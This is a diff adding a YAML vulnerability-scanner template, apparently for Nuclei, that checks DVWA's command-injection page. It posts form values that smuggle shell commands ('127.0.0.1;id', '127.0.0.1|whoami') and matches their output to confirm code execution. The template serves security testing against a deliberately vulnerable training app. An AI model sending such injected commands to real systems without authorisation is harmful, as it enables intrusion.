@@ -1,0 +1,51 @@
+id: dvwa-command-injection
+
+info:
+  name: DVWA - Command Injection (Low Security)
+  author: vulnremediate
+  severity: critical
+  description: Command Injection in DVWA Command Injection module
+  tags: rce,dvwa,php,command-injection
+  reference:
+    - https://github.com/digininja/DVWA
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/vulnerabilities/exec/"
+
+    body: "ip=127.0.0.1;id&Submit=Submit"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "security=low; PHPSESSID=test"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/vulnerabilities/exec/"
+
+    body: "ip=127.0.0.1|whoami&Submit=Submit"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "security=low; PHPSESSID=test"
+
+    matchers:
+      - type: word
+        words:
+          - "www-data"
+          - "root"
+          - "apache"
+        condition: or
+        part: body
